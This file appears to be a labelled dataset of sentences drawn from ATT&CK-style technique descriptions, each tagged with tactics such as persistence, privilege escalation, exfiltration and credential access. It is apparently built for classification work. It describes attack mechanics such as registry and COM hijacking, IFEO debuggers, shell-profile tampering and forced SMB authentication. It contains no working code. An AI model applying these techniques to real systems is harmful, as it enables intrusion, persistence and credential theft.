"System file associations are listed under HKEY_CLASSES_ROOT\.[extension], for example HKEY_CLASSES_ROOT\.txt.",PERSISTENCE,PRIVILEGE_ESCALATION,,
The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler].,PERSISTENCE,PRIVILEGE_ESCALATION,,
The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"For example: 



* HKEY_CLASSES_ROOT\txtfile\shell\open\command

* HKEY_CLASSES_ROOT\txtfile\shell\print\command

* HKEY_CLASSES_ROOT\txtfile\shell\printto\command.",PERSISTENCE,PRIVILEGE_ESCALATION,,
The values of the keys listed are commands that are executed when the handler opens the file extension.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can modify these values to continually execute arbitrary commands.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.,PERSISTENCE,PRIVILEGE_ESCALATION,,
COM is a system within Windows to enable interaction between software components through the operating system.,PERSISTENCE,PRIVILEGE_ESCALATION,,
References to various COM objects are stored in the Registry.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed.,PERSISTENCE,PRIVILEGE_ESCALATION,,
When that system component is executed through normal system operation the adversary's code will be executed instead.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Emond is a [Launch Daemon] that accepts events from various services, runs them through a simple rules engine, and takes action.",PERSISTENCE,PRIVILEGE_ESCALATION,,
The emond binary at /sbin/emond will load any rules from the /etc/emond.d/rules/ directory and take action once an explicitly defined event takes place.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"The rule files are in the plist format and define the name, event type, and action to take.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Some examples of event types include system startup and user authentication.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Examples of actions are to run a system command or send an email.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"The emond service will not launch if there is no file present in the QueueDirectories path /private/var/db/emondClients, specified in the [Launch Daemon] configuration file at/System/Library/LaunchDaemons/com.apple.emond.plist.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. service.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers.,PERSISTENCE,PRIVILEGE_ESCALATION,,
IFEOs enable a developer to attach a debugger to an application.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., C:\dbg\ntsd.exe -g notepad.exe).",PERSISTENCE,PRIVILEGE_ESCALATION,,
IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Similar to [Accessibility Features], on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe).",PERSISTENCE,PRIVILEGE_ESCALATION,,
"After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol] will cause the ""debugger"" program to be executed with SYSTEM privileges.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Similar to [Process Injection], these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Malware may also use IFEO to [Impair Defenses] by registering invalid debuggers that redirect and effectively disable various system and security applications.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time.,PERSISTENCE,PRIVILEGE_ESCALATION,,
These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.,PERSISTENCE,PRIVILEGE_ESCALATION,,
There are tools available to perform these changes.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system.,PERSISTENCE,PRIVILEGE_ESCALATION,,
It contains functionality to add helper DLLs for extending functionality of the utility.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"A PowerShell profile (profile.ps1) is a script that runs when [PowerShell] starts and can be used as a logon script to customize user environments.
[PowerShell] supports several profiles depending on the user or host program.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"For example, there can be different profiles for [PowerShell] host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code.",PERSISTENCE,PRIVILEGE_ESCALATION,,
An administrator can also configure a profile that applies to all users and host programs on the local computer.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell] drives to gain persistence.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Every time a user opens a [PowerShell] session the modified script will be executed unless the -NoProfile flag is used when it is launched.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by executing malicious content triggered by user inactivity.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"The Windows screensaver application scrnsave.scr is located in C:\Windows\System32\, and C:\Windows\sysWOW64\ on 64-bit Windows systems, along with screensavers included with base Windows installations.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"The following screensaver settings are stored in the Registry (HKCU\Control Panel\Desktop\) and could be manipulated to achieve persistence:



* SCRNSAVE.exe - set to malicious PE path

* ScreenSaveActive - set to '1' to enable the screensaver

* ScreenSaverIsSecure - set to '0' to not require a password to unlock

* ScreenSaveTimeout - sets user inactivity timeout before screensaver is executed.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence by executing malicious content triggered by an interrupt signal.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals.,PERSISTENCE,PRIVILEGE_ESCALATION,,
A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Trap commands are of the following format trap 'command list' signals where ""command list"" will be executed when ""signals"" are received.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence through executing malicious commands triggered by a user’s shell.,PERSISTENCE,PRIVILEGE_ESCALATION,,
User [Unix Shell]s execute several configuration scripts at different points throughout the session based on events.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated.",PERSISTENCE,PRIVILEGE_ESCALATION,,
The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment.,PERSISTENCE,PRIVILEGE_ESCALATION,,
All login shells on a system use /etc/profile when initiated.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin.",PERSISTENCE,PRIVILEGE_ESCALATION,,
The login shell then configures the user environment with ~/.zprofile and ~/.zlogin.,PERSISTENCE,PRIVILEGE_ESCALATION,,
The interactive shell uses the ~/.zshrc to configure the user environment.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"Upon exiting, /etc/zlogout and ~/.zlogout are executed.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"For legacy programs, macOS executes /etc/bashrc on startup.",PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription.,PERSISTENCE,PRIVILEGE_ESCALATION,,
"WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.",PERSISTENCE,PRIVILEGE_ESCALATION,,
"Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.",PERSISTENCE,PRIVILEGE_ESCALATION,,
WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.,PERSISTENCE,PRIVILEGE_ESCALATION,,
Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target.,DEFENSE_EVASION,,,
Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.,DEFENSE_EVASION,,,
Guardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.,DEFENSE_EVASION,,,
This use of guardrails is distinct from typical [Virtualization/Sandbox Evasion].,DEFENSE_EVASION,,,
"While use of [Virtualization/Sandbox Evasion] may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",DEFENSE_EVASION,,,
Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment.,DEFENSE_EVASION,,,
Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target.,DEFENSE_EVASION,,,
Environmental keying is an implementation of [Execution Guardrails] that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.,DEFENSE_EVASION,,,
Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload.,DEFENSE_EVASION,,,
"Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses..",DEFENSE_EVASION,,,
"Similar to [Obfuscated Files or Information], adversaries may use environmental keying to help protect their TTPs and evade detection.",DEFENSE_EVASION,,,
Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.,DEFENSE_EVASION,,,
This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.,DEFENSE_EVASION,,,
"Like other [Execution Guardrails], environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.",DEFENSE_EVASION,,,
This activity is distinct from typical [Virtualization/Sandbox Evasion].,DEFENSE_EVASION,,,
"While use of [Virtualization/Sandbox Evasion] may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",DEFENSE_EVASION,,,
The data may also be sent to an alternate network location from the main command and control server.,EXFILTRATION,,,
"Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel.",EXFILTRATION,,,
Different protocol channels could also include Web services such as cloud storage.,EXFILTRATION,,,
"Adversaries may also opt to encrypt and/or obfuscate these alternate channels. 



[Exfiltration Over Alternative Protocol] can be done using various common operating system utilities such as [Net]/SMB or FTP.",EXFILTRATION,,,
Asymmetric encryption algorithms are those that use different keys on each end of the channel.,EXFILTRATION,,,
"Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key.",EXFILTRATION,,,
Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity.,EXFILTRATION,,,
The public keys of each entity are exchanged before encrypted communications begin.,EXFILTRATION,,,
Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged.,EXFILTRATION,,,
Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.,EXFILTRATION,,,
Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel.,EXFILTRATION,,,
Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel.,EXFILTRATION,,,
This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data.,EXFILTRATION,,,
"Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol.",EXFILTRATION,,,
This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).,EXFILTRATION,,,
Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.,EXFILTRATION,,,
"Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS).",EXFILTRATION,,,
This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.,EXFILTRATION,,,
Adversaries may steal data by exfiltrating it over an existing command and control channel.,EXFILTRATION,,,
Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,EXFILTRATION,,,
Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel.,EXFILTRATION,,,
"If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.",EXFILTRATION,,,
Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel.,EXFILTRATION,,,
"If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.",EXFILTRATION,,,
Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.,EXFILTRATION,,,
"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive.",EXFILTRATION,,,
"In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user.",EXFILTRATION,,,
The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.,EXFILTRATION,,,
Adversaries may attempt to exfiltrate data over a USB connected physical device.,EXFILTRATION,,,
"In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user.",EXFILTRATION,,,
The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.,EXFILTRATION,,,
"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel.",EXFILTRATION,,,
Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise.,EXFILTRATION,,,
Firewall rules may also already exist to permit traffic to these services.,EXFILTRATION,,,
Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel.,EXFILTRATION,,,
Examples of cloud storage services include Dropbox and Google Docs.,EXFILTRATION,,,
Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.,EXFILTRATION,,,
Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel.,EXFILTRATION,,,
Code repositories are often accessible via an API (ex: https://api.github.com).,EXFILTRATION,,,
"Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.",EXFILTRATION,,,
Exfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.,EXFILTRATION,,,
"The weakness in the system can be a bug, a glitch, or a design vulnerability.",INITIAL_ACCESS,,,
"These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services..",INITIAL_ACCESS,,,
"If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container.",INITIAL_ACCESS,,,
"This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host], or take advantage of weak identity and access management policies.",INITIAL_ACCESS,,,
"For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.",INITIAL_ACCESS,,,
Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior.,EXECUTION,,,
Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution.,EXECUTION,,,
Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system.,EXECUTION,,,
"Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.",EXECUTION,,,
"Several types exist:



### Browser-based Exploitation.",EXECUTION,,,
Web browsers are a common target through [Drive-by Compromise] and [Spearphishing Link].,EXECUTION,,,
Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser.,EXECUTION,,,
"These often do not require an action by the user for the exploit to be executed.



### Office Applications.",EXECUTION,,,
Common office and productivity applications such as Microsoft Office are also targeted through [Phishing].,EXECUTION,,,
Malicious files will be transmitted directly as attachments or through links to download them.,EXECUTION,,,
"These require the user to open the document or file for the exploit to run.



### Common Third-party Applications.",EXECUTION,,,
Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation.,EXECUTION,,,
"Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems.",EXECUTION,,,
"Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file.",EXECUTION,,,
"For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",EXECUTION,,,
Adversaries may exploit software vulnerabilities in an attempt to collect credentials.,CREDENTIAL_ACCESS,,,
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems.",CREDENTIAL_ACCESS,,,
"One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.",CREDENTIAL_ACCESS,,,
Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.,CREDENTIAL_ACCESS,,,
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.",DEFENSE_EVASION,,,
Adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery].,DEFENSE_EVASION,,,
The security software will likely be targeted directly for exploitation.,DEFENSE_EVASION,,,
There are examples of antivirus software being targeted by persistent threat groups to avoid detection.,DEFENSE_EVASION,,,
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",PRIVILEGE_ESCALATION,,,
"Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.",PRIVILEGE_ESCALATION,,,
"When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system.",PRIVILEGE_ESCALATION,,,
"Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system.",PRIVILEGE_ESCALATION,,,
This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable.,PRIVILEGE_ESCALATION,,,
"This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host.",PRIVILEGE_ESCALATION,,,
This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.,PRIVILEGE_ESCALATION,,,
Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode.,PRIVILEGE_ESCALATION,,,
This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD)..,PRIVILEGE_ESCALATION,,,
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.",LATERAL_MOVEMENT,,,
"An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery] or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation.",LATERAL_MOVEMENT,,,
"Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.",LATERAL_MOVEMENT,,,
There are several well-known vulnerabilities that exist in common services such as SMB.,LATERAL_MOVEMENT,,,
Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation] as a result of lateral movement exploitation as well.,LATERAL_MOVEMENT,,,
"Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations.",INITIAL_ACCESS,PERSISTENCE,,
There are often remote service gateways that manage connections and credential authentication for these services.,INITIAL_ACCESS,PERSISTENCE,,
Services such as [Windows Remote Management] and [VNC] can also be used externally.,INITIAL_ACCESS,PERSISTENCE,,
"Access to [Valid Accounts] to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.",INITIAL_ACCESS,PERSISTENCE,,
Access may also be gained through an exposed service that doesn’t require authentication.,INITIAL_ACCESS,PERSISTENCE,,
"In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",INITIAL_ACCESS,PERSISTENCE,,
Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,COMMAND_AND_CONTROL,,,
"Adversaries may use the information from [File and Directory Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",DISCOVERY,,,
Many command shell utilities can be used to obtain this information.,DISCOVERY,,,
"Examples include dir, tree, ls, find, and locate.",DISCOVERY,,,
Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files..,DEFENSE_EVASION,,,
"Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions.",DEFENSE_EVASION,,,
"This may enable malicious activity such as modifying, replacing, or deleting specific files or directories.",DEFENSE_EVASION,,,
"Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features], [Boot or Logon Initialization Scripts], [Unix Shell Configuration Modification], or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow].",DEFENSE_EVASION,,,
"Most Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group.",DEFENSE_EVASION,,,
"While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: chown (short for change owner), and chmod (short for change mode).",DEFENSE_EVASION,,,
Adversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it.,DEFENSE_EVASION,,,
They could subsequently lock others out of the file.,DEFENSE_EVASION,,,
"Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification] or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow].",DEFENSE_EVASION,,,
Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).,DEFENSE_EVASION,,,
"Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders.",DEFENSE_EVASION,,,
"Further, [PowerShell] provides cmdlets that can be used to retrieve or modify file and directory DACLs.",DEFENSE_EVASION,,,
"Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features], [Boot or Logon Initialization Scripts], or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow].",DEFENSE_EVASION,,,
Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality.,IMPACT,,,
"These devices could include the motherboard, hard drive, or video cards.",IMPACT,,,
"In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices.",IMPACT,,,
"Depending on the device, this attack may also result in [Data Destruction].",IMPACT,,,
Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.,CREDENTIAL_ACCESS,,,
The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing.,CREDENTIAL_ACCESS,,,
When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.,CREDENTIAL_ACCESS,,,
This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.,CREDENTIAL_ACCESS,,,
Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails.,CREDENTIAL_ACCESS,,,
WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.,CREDENTIAL_ACCESS,,,
Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication.,CREDENTIAL_ACCESS,,,
"An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection]), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s).",CREDENTIAL_ACCESS,,,
"When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.",CREDENTIAL_ACCESS,,,
There are several different ways this can occur.,CREDENTIAL_ACCESS,,,
"Some specifics from in-the-wild use include:



* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection]).",CREDENTIAL_ACCESS,,,
"The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request. 

* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \\[remote address]\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.",CREDENTIAL_ACCESS,,,
Adversaries may forge credential materials that can be used to gain access to web applications or Internet services.,CREDENTIAL_ACCESS,,,
"Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.",CREDENTIAL_ACCESS,,,
Adversaries may generate these credential materials in order to gain access to web resources.,CREDENTIAL_ACCESS,,,
"This differs from [Steal Web Session Cookie], [Steal Application Access Token], and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.",CREDENTIAL_ACCESS,,,
"The generation of web credentials often requires secret values, such as passwords, [Private Keys], or other cryptographic seed values.",CREDENTIAL_ACCESS,,,
"Once forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material]), which may bypass multi-factor and other authentication protection mechanisms.",CREDENTIAL_ACCESS,,,
An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.,CREDENTIAL_ACCESS,,,
An adversary may utilize [Private Keys] to compromise an organization's token-signing certificate to create forged SAML tokens.,CREDENTIAL_ACCESS,,,
